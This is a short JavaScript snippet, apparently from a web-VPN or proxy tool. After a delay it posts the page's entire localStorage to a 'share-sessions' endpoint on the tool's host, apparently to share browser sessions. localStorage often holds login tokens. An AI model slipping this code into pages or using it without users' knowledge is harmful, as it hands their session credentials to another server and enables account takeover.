(async function () {

  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

  await sleep(3000)
  await fetch(webvpn.site + '/share-sessions?shareId=' + webvpn.shareId, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ localStorage: { ...localStorage } })
  }).then(res => res.json())

})();
